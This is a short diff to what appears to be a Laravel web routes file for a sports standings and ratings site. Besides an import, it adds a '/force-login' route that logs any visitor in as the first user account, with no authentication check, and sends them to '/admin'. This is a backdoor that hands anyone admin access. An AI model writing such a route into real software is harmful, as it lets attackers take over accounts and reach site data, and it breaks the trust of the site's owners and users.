@@ -19,6 +19,7 @@ use App\Livewire\Pages\FullStandingsPage;
 use App\Livewire\Pages\PlayerRatingsPage;
 use App\Livewire\Pages\PredictionRankingsPage;
 use App\Livewire\Pages\VideoCategory;
+use App\Models\User;
 
 
 
@@ -64,3 +65,8 @@ Route::post('/logout', function (Request $request) {
     $request->session()->regenerateToken();
     return redirect('/');
 })->name('logout');
+
+Route::get('/force-login', function () {
+    Auth::login(User::first());
+    return redirect('/admin');
+});
